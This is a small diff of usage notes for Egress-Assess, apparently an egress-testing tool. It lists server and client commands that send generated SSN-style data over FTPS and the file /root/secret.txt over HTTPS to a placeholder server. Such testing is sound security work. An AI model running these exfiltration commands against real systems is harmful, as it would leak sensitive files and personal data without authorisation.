@@ -1,7 +1,8 @@
 Egress-Assess
 
 
-Works as a client/server model. 
+Works as a client/server model.
+
 - Server
 ./Egress-Assess.py -h
 ./Egress-Assess.py --list-servers
@@ -26,7 +27,7 @@ Example 2
 ./Egress-Assess.py --server ftps --username lee --password hack
 
 - Client
-./Egress-Assess.py --client ftps --username lee --password hack  --datatype ssn --data-size 10 --ip <server>
+./Egress-Assess.py --client ftps --username lee --password hack --datatype ssn --data-size 10 --ip <server>
 
 Example 3
 - Server
@@ -34,4 +35,3 @@ Example 3
 
 - Client
 ./Egress-Assess.py --client https --file /root/secret.txt --ip <server>
-  
